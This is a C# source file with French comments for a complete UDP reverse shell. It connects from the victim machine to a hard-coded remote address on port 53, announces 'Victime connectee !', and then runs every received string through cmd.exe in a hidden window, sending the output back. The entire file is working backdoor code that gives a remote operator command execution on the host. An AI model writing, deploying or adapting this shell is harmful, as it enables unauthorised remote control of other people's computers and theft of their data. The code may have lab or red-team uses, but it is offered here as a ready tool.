using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System;
using System.Collections.Generic;
using System.Linq;

/*
Ce programme se connecte en UDP à une machine distance. Ensuite, il va lire et exécuter toutes les commandes reçues.
*/

namespace UdpRevShell
{
	public class Program
	{

// Point d'entrée du programme (main)
		public static void Main(string[] args)
		{
			// Ce constructeur assigne de façon arbitraire le port local
			UdpClient udpClient = new UdpClient(13370);

			try{
				// Connexion distante
				udpClient.Connect("172.17.224.173", 53);

				// Envoi d'un message à l'établissement de la connexion
				Byte[] sendBytes = Encoding.ASCII.GetBytes("Victime connectee !\n");
				udpClient.Send(sendBytes, sendBytes.Length);

				// L'objet IPEndPoint va nous permettre de lire les datagrams UDP envoyés depuis n'importe quelle source
				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

				// Début de la boucle sans fin pour maintenir la connexion
				while(true){

					// Lecture des informations recues sur le socket UDP
					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
					string returnData = Encoding.ASCII.GetString(receiveBytes);

					// Affichage dans la console des informations reçues
					Console.WriteLine("Commande recue de l'adresse IP : " + RemoteIpEndPoint.Address.ToString() + " ==> "+ returnData.ToString());

	
					// Creation d'un processus pour pouvoir exécuter des commandes
					ProcessStartInfo p;
					Process process;

					// Initialise une nouvelle instance de la classe ProcessStartInfo et spécifie le fichier à exécuter
					p = new ProcessStartInfo("cmd.exe", "/c " + returnData.ToString());

					// On définit ici de ne pas démarrer dans une nouvelle fenêtre
					p.CreateNoWindow = true;
					p.UseShellExecute = false;
					p.RedirectStandardError = true;
					p.RedirectStandardInput = true;
					p.RedirectStandardOutput = true;

					// Exécution de la commande
					process = Process.Start(p);
					process.WaitForExit();
					string output = process.StandardOutput.ReadToEnd();
					string error = process.StandardError.ReadToEnd();
					int exitCode = process.ExitCode;
					
					// Affichage en console du résultat de la commande exécutée
					Console.WriteLine("Résultat de la commande executee : " + output + "\n(Code de retour : " + exitCode + ")");

					// Test si retour vide
					bool result = String.Equals(output,"");
					if(result) { 
						output = " ";
					}
					else {
						// Envoi du résultat de la commande
						Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);
						udpClient.Send(outputtobytes, outputtobytes.Length);
					}
					
				}
				
				
				// Fermeture de la connexion UDP
				udpClient.Close();

			}
			catch (Exception e ) {
				// Affiche d'une erreur en cas de connexion impossible
				Console.WriteLine(e.ToString());
			}

		}

	}
}